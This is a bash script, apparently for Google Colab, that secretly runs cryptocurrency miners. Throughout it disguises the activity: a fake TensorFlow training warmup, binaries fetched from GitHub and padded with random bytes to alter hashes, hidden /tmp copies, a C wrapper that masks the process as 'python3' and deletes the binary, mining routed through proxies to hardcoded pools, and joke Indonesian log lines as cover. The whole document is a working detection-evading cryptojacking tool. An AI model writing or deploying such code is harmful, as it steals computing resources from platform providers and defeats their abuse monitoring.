#!/bin/bash
# MINN v8 — peakminer 2.17 + log konyol + anti-detect full
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

PX="niceproxy.io:17522"
PU="riset_h9wl-country-SG-ssid-06WZKklIAI"
PP="riset"

# ====== FUNNY LOG GENERATOR ======
log() {
    local msgs=(
        "🔥 Lagi masak indomie goreng batch #$1..."
        "🥵 Abang nguli dulu bentar, jangan diganggu..."
        "💨 Ngepush gerobak ke server $1..."
        "🍜 Lagi nyeduh kuah, sabar ya bos..."
        "🏃 Lari keliling komplek putaran ke-$1..."
        "🫧 Nyuci piring dulu, bentar lagi beres..."
        "🎮 Main catur sama kucing, skor $1-$1..."
        "🧹 Lagi nyapu halaman, debunya banyak..."
        "🛒 Belanja di warung, antri nomor $1..."
        "🐔 Kasih makan ayam dulu, baru lanjut..."
        "📦 Packing pesanan, estimasi $1 menit..."
        "☕ Bikin kopi dulu, batch ke-$1..."
        "🧊 Ngisi es batu di kulkas..."
        "🪴 Siram tanaman dulu, pada layu..."
    )
    local idx=$((RANDOM % ${#msgs[@]}))
    echo "[$(date +%H:%M:%S)] ${msgs[$idx]}"
}

echo "========================================"
echo "  MINN v8 — peakminer edition"
echo "  Warung: $WRK"
echo "========================================"

# === 1. Warmup ===
echo "[*] Pemanasan kompor..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Setup ===
echo "[*] Siapin bahan masakan..."
apt-get install -y -qq proxychains4 2>/dev/null

rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m

# peakminer 2.17
wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak || exit 1
# sse2 untuk tidecoin
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1

# Padding binary
dd if=/dev/urandom of=peak bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
chmod +x peak sse2

# Proxy config
rm -f /etc/proxychains4.conf
cat > /etc/proxychains4.conf << PCEOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http $PU $PP $PX
PCEOF

# Exec wrapper (rename + unlink)
cat > /tmp/w.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc,char**argv){
    if(argc<2)return 1;
    size_t l=strlen(argv[0])+1;
    memset(argv[0],0,l);
    strncpy(argv[0],"python3",l-1);
    unlink(argv[1]);
    execvp(argv[1],&argv[1]);
    return 1;
}
CEOF
gcc -o /tmp/w /tmp/w.c -s 2>/dev/null

echo "[*] Bahan siap. Masak!"

# === 3. Mulai masak ===
sleep $((RANDOM % 8 + 3))

B1="/tmp/.w$(date +%s | md5sum | head -c 6)"
B2="/tmp/.k$(date +%s | sha1sum | head -c 6)"
cp peak "$B1" && cp sse2 "$B2"
chmod +x "$B1" "$B2"
rm -f peak sse2

# === LOG THREAD ===
(
    c=0
    while true; do
        c=$((c+1))
        log "$c"
        sleep $((RANDOM % 45 + 15))
    done
) &
LOGPID=$!

# === PRL mining (peak) ===
(while true; do
    proxychains4 -q /tmp/w "$B1" \
        --coin pearl \
        --url 23.94.21.110:80 \
        --user "${PRL}.${WRK}" \
        --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443 \
        2>/dev/null
    [ -f "$B1" ] || { cp peak "$B1" 2>/dev/null; chmod +x "$B1" 2>/dev/null; }
    sleep 5
done) &
PID1=$!
sleep 8

# === TDC mining (sse2) ===
[ -f "$B2" ] && proxychains4 -q /tmp/w "$B2" \
    -a yespowertide \
    -o 47.251.244.12:80 \
    -u "${TDC}.${WRK}" \
    -t 1 >/dev/null 2>&1 &
PID2=$!

log 1

# === Cleanup ===
trap 'kill $PID1 $PID2 $LOGPID 2>/dev/null; rm -f /tmp/w /tmp/w.c "$B1" "$B2" 2>/dev/null; echo "[*] Warung tutup."' EXIT
(sleep 10800; echo "[*] Udah jam 3, warung tutup dulu.") &
wait